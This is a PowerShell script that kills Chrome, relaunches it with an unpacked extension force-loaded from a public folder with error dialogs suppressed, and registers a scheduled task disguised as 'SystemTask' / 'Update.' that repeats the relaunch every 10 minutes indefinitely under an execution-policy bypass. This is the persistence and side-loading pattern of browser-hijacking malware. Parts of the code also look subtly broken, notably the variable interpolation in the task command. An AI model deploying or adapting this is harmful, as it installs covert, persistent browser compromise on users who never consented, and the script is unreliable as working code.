$extPath = "C:\Users\Public\Chrome"

# Terminate all running instances of Chrome, if any
Get-Process -Name chrome -ErrorAction SilentlyContinue | ForEach-Object {
    $_.Kill()
}

# Check if the extension directory exists
if (Test-Path -Path $extPath) {
    # Start Chrome with the extension
    try {
        Start-Process chrome "--load-extension=`"$extPath`", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble" -ErrorAction Stop
    } catch {
        # If an error occurs while starting Chrome, display the error message
        $_
    }
} else {
    # If the extension directory does not exist, display a message
    "Extension directory not found."
}

# Create the scheduled task
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -Command `"& { $extPath = 'C:\Users\Public\Chrome'; Start-Process chrome '--load-extension=""$extPath"" --restore-last-session --noerrdialogs --disable-session-crashed-bubble' }`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
Register-ScheduledTask -TaskName "SystemTask" -Action $action -Trigger $trigger -Description "Update."